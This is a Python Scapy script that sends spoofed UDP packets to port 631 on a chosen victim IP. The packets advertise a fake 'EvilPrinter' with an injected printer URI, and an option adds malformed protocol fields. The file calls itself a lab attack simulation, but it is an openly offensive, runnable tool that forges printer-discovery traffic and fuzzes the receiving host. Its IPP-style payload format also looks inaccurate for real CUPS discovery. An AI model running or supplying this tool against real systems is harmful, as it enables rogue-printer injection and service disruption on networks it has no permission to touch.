#!/usr/bin/env python3
"""Generate and send custom CUPS printer-discovery packets using Scapy."""

import argparse
import json
import logging
from pathlib import Path
from typing import List, Optional

from scapy.all import IP, UDP, Raw, send, wrpcap

logger = logging.getLogger("cups_attack")


def build_payload(payload_type: str, printer_name: str, printer_uri: str, location: str, malform: bool = False) -> bytes:
    """Create a synthetic CUPS/IPP-like payload used in an isolated lab."""
    if payload_type == "advertise":
        payload = (
            "IPP/1.1 200 OK\r\n"
            "Content-Type: application/ipp\r\n"
            "Printer-Name: {printer_name}\r\n"
            "Printer-URI: {printer_uri}\r\n"
            "Printer-Location: {location}\r\n"
            "Printer-Info: {printer_name}\r\n"
            "Attributes-Charset: utf-8\r\n"
            "Attributes-Natural-Language: en-US\r\n"
            "CUPS-Make-and-Model: EvilPrinter 1.0\r\n"
            "CUPS-Server: CUPS/2.4.0\r\n"
            "\r\n"
        ).format(printer_name=printer_name, printer_uri=printer_uri, location=location)
    elif payload_type == "probe":
        payload = (
            "CUPS-Get-Printers\r\n"
            "Content-Type: application/ipp\r\n"
            "Printer-Name: {printer_name}\r\n"
            "Printer-URI: {printer_uri}\r\n"
            "\r\n"
        ).format(printer_name=printer_name, printer_uri=printer_uri)
    elif payload_type == "malformed":
        payload = (
            "IPP/1.1 200 OK\r\n"
            "Content-Type: application/ipp\r\n"
            "Printer-Name: {printer_name}\r\n"
            "Printer-URI: {printer_uri}\r\n"
            "Printer-Location: {location}\r\n"
            "Attributes-Charset: utf-8\r\n"
            "Unknown-Field: \x00\x01\x02\x03\r\n"
            "\r\n"
        ).format(printer_name=printer_name, printer_uri=printer_uri, location=location)
    else:
        raise ValueError(f"Unknown payload type: {payload_type}")

    if malform:
        payload = payload.replace("Printer-URI:", "Printer-URI-\x00:")
        payload = payload.replace("-Location:", "-Location\xff:")
    return payload.encode("utf-8", errors="replace")


def build_packet(src_ip: str, dst_ip: str, sport: int, dport: int, payload: bytes) -> IP:
    return IP(src=src_ip, dst=dst_ip) / UDP(sport=sport, dport=dport) / Raw(load=payload)


def send_packets(args: argparse.Namespace) -> List[str]:
    packets = []
    source_ip = args.source_ip or "192.168.56.10"
    for index in range(args.count):
        payload = build_payload(
            payload_type=args.payload_type,
            printer_name=args.printer_name,
            printer_uri=args.printer_uri,
            location=args.location,
            malform=args.malformed,
        )
        pkt = build_packet(source_ip, args.target, args.sport, args.port, payload)
        packets.append(pkt)
        send(pkt, verbose=args.verbose)
        logger.info("Sent packet %s/%s to %s:%s", index + 1, args.count, args.target, args.port)
        if args.interval > 0:
            import time
            time.sleep(args.interval)

    if args.pcap:
        wrpcap(args.pcap, packets)
        logger.info("Saved packet capture to %s", args.pcap)

    return [f"{args.target}:{args.port} -> {args.printer_uri}" for _ in range(args.count)]


def configure_logging(log_file: Optional[str]) -> None:
    handlers = [logging.StreamHandler()]
    if log_file:
        handlers.append(logging.FileHandler(log_file, mode="a", encoding="utf-8"))
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s", handlers=handlers)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Craft and send custom CUPS printer-discovery packets.")
    parser.add_argument("--target", required=True, help="Victim IP address or multicast target to craft discovery traffic to.")
    parser.add_argument("--source-ip", default="192.168.56.10", help="Spoofed source IP for the fake printer advertisement.")
    parser.add_argument("--printer-name", default="EvilPrinter", help="Name to advertise for the fake printer.")
    parser.add_argument("--printer-uri", default="ipp://192.168.56.10:631/printers/EvilPrinter", help="Printer URI to inject.")
    parser.add_argument("--location", default="Attacker Lab", help="Discovery metadata location for the fake printer.")
    parser.add_argument("--payload-type", choices=["advertise", "probe", "malformed"], default="advertise", help="Type of discovery payload to send.")
    parser.add_argument("--port", type=int, default=631, help="Destination UDP port (typically 631 for CUPS discovery).")
    parser.add_argument("--sport", type=int, default=5353, help="Source UDP port to use for the forged advertisement.")
    parser.add_argument("--count", type=int, default=3, help="Number of packets to send.")
    parser.add_argument("--interval", type=float, default=1.0, help="Delay between packets in seconds.")
    parser.add_argument("--malformed", action="store_true", help="Inject malformed protocol fields in the payload.")
    parser.add_argument("--pcap", default=None, help="Write generated packets to this PCAP file.")
    parser.add_argument("--log-file", default=None, help="Write logs to a file.")
    parser.add_argument("--json-output", default=None, help="Write a JSON summary of the activity.")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose Scapy packet output.")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    configure_logging(args.log_file)
    logger.info("Starting CUPS discovery attack simulation against %s", args.target)
    results = send_packets(args)

    if args.json_output:
        Path(args.json_output).parent.mkdir(parents=True, exist_ok=True)
        with open(args.json_output, "w", encoding="utf-8") as fh:
            json.dump({
                "target": args.target,
                "printer_uri": args.printer_uri,
                "packets_sent": len(results),
                "details": results,
            }, fh, indent=2)


if __name__ == "__main__":
    main()
